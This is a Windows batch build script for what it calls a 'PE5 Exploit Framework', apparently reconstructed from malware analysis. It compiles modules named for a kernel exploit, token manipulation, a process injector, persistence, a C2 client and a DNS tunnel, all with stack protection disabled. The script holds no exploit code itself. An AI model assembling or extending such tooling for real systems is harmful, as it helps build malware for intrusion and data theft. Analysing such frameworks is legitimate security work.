@echo off
REM PE5 Exploit Framework - Windows Build Script
REM
REM RECONSTRUCTED FROM SECURITY ANALYSIS
REM Classification: TLP:RED - Security Research Only
REM
REM Requirements:
REM   - Visual Studio 2019/2022 with C++ Desktop Development
REM   - Windows SDK 10.0+
REM
REM Usage:
REM   build.bat [target]
REM   
REM   Targets:
REM     all   - Build all modules (default)
REM     pe5   - Build PE #5 only
REM     pe4   - Build PE #4 only
REM     pe1   - Build PE #1 only
REM     clean - Clean build artifacts

setlocal enabledelayedexpansion

echo ========================================
echo PE5 EXPLOIT FRAMEWORK BUILD SYSTEM
echo ========================================
echo.

REM Find Visual Studio
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist "%VSWHERE%" (
    echo ERROR: Visual Studio not found.
    echo Please install Visual Studio 2019 or 2022 with C++ Desktop Development.
    exit /b 1
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
    set "VS_PATH=%%i"
)

if not defined VS_PATH (
    echo ERROR: Visual Studio C++ tools not found.
    exit /b 1
)

echo Found Visual Studio at: %VS_PATH%

REM Setup environment
call "%VS_PATH%\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1

REM Check tools
where cl.exe >nul 2>&1
if errorlevel 1 (
    echo ERROR: cl.exe not found in PATH
    exit /b 1
)

where ml64.exe >nul 2>&1
if errorlevel 1 (
    echo ERROR: ml64.exe not found in PATH
    exit /b 1
)

echo Compiler: cl.exe
echo Assembler: ml64.exe
echo.

REM Parse arguments
set TARGET=%1
if "%TARGET%"=="" set TARGET=all

REM Create directories
if not exist build mkdir build
if not exist build\bin mkdir build\bin
if not exist build\obj mkdir build\obj

REM Build based on target
if "%TARGET%"=="clean" goto :clean
if "%TARGET%"=="pe5" goto :build_pe5
if "%TARGET%"=="pe4" goto :build_pe4
if "%TARGET%"=="pe1" goto :build_pe1
if "%TARGET%"=="all" goto :build_all

echo Unknown target: %TARGET%
exit /b 1

:build_all
echo Building all modules...
call :build_pe5
if errorlevel 1 exit /b 1
call :build_pe4
if errorlevel 1 exit /b 1
call :build_pe1
if errorlevel 1 exit /b 1
call :build_pe2
if errorlevel 1 exit /b 1
call :build_pe3
if errorlevel 1 exit /b 1
goto :success

:build_pe5
echo.
echo [PE #5] Building kernel exploit...
echo ----------------------------------------

REM Compile C files
cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\exploit.obj" pe5_exploit\exploit.c
if errorlevel 1 exit /b 1

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\token_manipulation.obj" pe5_exploit\token_manipulation.c
if errorlevel 1 exit /b 1

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\decryption.obj" pe5_exploit\decryption.c
if errorlevel 1 exit /b 1

REM Compile assembly
ml64 /nologo /c /Cx /Fo"build\obj\exploit_asm.obj" pe5_exploit\exploit_asm.asm
if errorlevel 1 exit /b 1

REM Link DLL
link /nologo /DLL /OUT:"build\bin\pe5_exploit.dll" ^
     /ENTRY:DllMain ^
     build\obj\exploit.obj build\obj\token_manipulation.obj ^
     build\obj\decryption.obj build\obj\exploit_asm.obj ^
     kernel32.lib ntdll.lib
if errorlevel 1 exit /b 1

REM Link EXE
link /nologo /OUT:"build\bin\pe5_exploit.exe" ^
     /ENTRY:PE5_ExploitMain ^
     build\obj\exploit.obj build\obj\token_manipulation.obj ^
     build\obj\decryption.obj build\obj\exploit_asm.obj ^
     kernel32.lib ntdll.lib
if errorlevel 1 exit /b 1

echo [PE #5] Build complete.
exit /b 0

:build_pe4
echo.
echo [PE #4] Building stub launcher...
echo ----------------------------------------

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\stub.obj" pe4_stub\stub.c
if errorlevel 1 exit /b 1

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\injector.obj" pe4_stub\injector.c
if errorlevel 1 exit /b 1

link /nologo /DLL /OUT:"build\bin\pe4_stub.dll" ^
     /ENTRY:DllMain ^
     build\obj\stub.obj build\obj\injector.obj ^
     kernel32.lib ntdll.lib
if errorlevel 1 exit /b 1

echo [PE #4] Build complete.
exit /b 0

:build_pe1
echo.
echo [PE #1] Building main loader...
echo ----------------------------------------

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\loader.obj" pe1_loader\loader.c
if errorlevel 1 exit /b 1

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\persistence.obj" pe1_loader\persistence.c
if errorlevel 1 exit /b 1

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\c2_client.obj" pe1_loader\c2_client.c
if errorlevel 1 exit /b 1

link /nologo /DLL /OUT:"build\bin\pe1_loader.dll" ^
     /ENTRY:DllMain ^
     build\obj\loader.obj build\obj\persistence.obj build\obj\c2_client.obj ^
     kernel32.lib ntdll.lib advapi32.lib winhttp.lib
if errorlevel 1 exit /b 1

echo [PE #1] Build complete.
exit /b 0

:build_pe2
echo.
echo [PE #2] Building DNS tunnel...
echo ----------------------------------------

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\dns_tunnel.obj" pe2_dns_tunnel\dns_tunnel.c
if errorlevel 1 exit /b 1

link /nologo /DLL /OUT:"build\bin\pe2_dns.dll" ^
     build\obj\dns_tunnel.obj ^
     kernel32.lib dnsapi.lib crypt32.lib
if errorlevel 1 exit /b 1

echo [PE #2] Build complete.
exit /b 0

:build_pe3
echo.
echo [PE #3] Building container...
echo ----------------------------------------

cl /nologo /W4 /O2 /GS- /c /I common ^
   /Fo"build\obj\container.obj" pe3_container\container.c
if errorlevel 1 exit /b 1

link /nologo /DLL /OUT:"build\bin\pe3_container.dll" ^
     build\obj\container.obj ^
     kernel32.lib
if errorlevel 1 exit /b 1

echo [PE #3] Build complete.
exit /b 0

:clean
echo Cleaning build artifacts...
if exist build rmdir /s /q build
echo Done.
exit /b 0

:success
echo.
echo ========================================
echo BUILD SUCCESSFUL
echo ========================================
echo.
echo Output files:
dir /b build\bin\*.dll build\bin\*.exe 2>nul
echo.
echo Build artifacts in: build\bin\
exit /b 0
